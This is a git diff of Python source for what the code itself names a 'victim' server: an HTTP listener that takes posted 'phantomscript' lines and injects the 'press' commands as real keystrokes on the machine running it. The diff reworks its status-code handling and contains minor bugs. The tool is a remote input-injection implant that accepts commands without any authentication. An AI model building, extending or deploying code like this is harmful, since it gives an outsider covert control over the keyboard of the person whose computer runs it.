@@ -1,19 +1,34 @@
 import keyboard
 from http.server import HTTPServer, BaseHTTPRequestHandler
+# ! from collections import defaultdict
+
+# ! codes_to_priorities = defaultdict(lambda x : 0)
+# ! codes_to_priorities[200] = 1
+# ! codes_to_priorities[422] = 2
+# ! codes_to_priorities[400] = 3
 
 def try_run_from_phantomscript_command(phantomscript_command: str):
-    phantomscript_command = phantomscript_command.strip().lower()
-    
-    if phantomscript_command.startswith(("#", '//')) or not phantomscript_command:
-        return True
-    
-    if phantomscript_command.startswith('press'):
-        keyboard.press(phantomscript_command.removeprefix('press').strip().replace(' ', '+'))
+    try:
+        phantomscript_command = phantomscript_command.strip().lower()
 
-        return True
+        if phantomscript_command.startswith(("#", '//')) or not phantomscript_command:
+            return 200
+
+        if phantomscript_command.startswith('press'):
+            try:
+                keyboard.press_and_release(phantomscript_command.removeprefix('press').strip().replace(' ', '+'))
+            
+            except ValueError:
+                # Value is not a key
+                return 422
+
+            return 200
 
 
-    return False
+        return 422
+
+    except:
+        return 400
 
 class PhantomLinkVictimServer(BaseHTTPRequestHandler):
     def do_POST(self):
@@ -22,12 +37,15 @@ class PhantomLinkVictimServer(BaseHTTPRequestHandler):
                 payload = self.rfile.read(int(self.headers['Content-Length'])).decode()
                 print(payload)
                 for line in payload.splitlines():
-                    if not try_run_from_phantomscript_command(line):
-                        self.send_response(422)
-                        self.end_headers()
-                        return
+                    currentStatusCode = try_run_from_phantomscript_command(line)
+                    if not str(currentStatusCode).startswith(("4", "3")): continue
+                        
+                    self.send_response(currentStatusCode)
+                    self.end_headers()
+                    return
 
-            self.send_response(200)
+
+            self.send_response(currentStatusCode)
             self.end_headers()
 
         except Exception as e:
